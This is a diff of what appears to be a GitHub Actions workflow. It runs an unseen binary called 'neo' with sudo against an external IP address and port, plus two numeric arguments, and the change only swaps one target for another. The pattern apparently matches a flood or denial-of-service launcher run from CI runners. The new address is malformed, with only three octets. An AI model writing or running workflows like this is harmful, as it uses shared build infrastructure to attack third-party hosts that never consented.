@@ -10,4 +10,4 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x neo
-    - run: sudo ./neo 20.204.159.214 20251 120 999
+    - run: sudo ./neo 193.132.23 39482 10 999
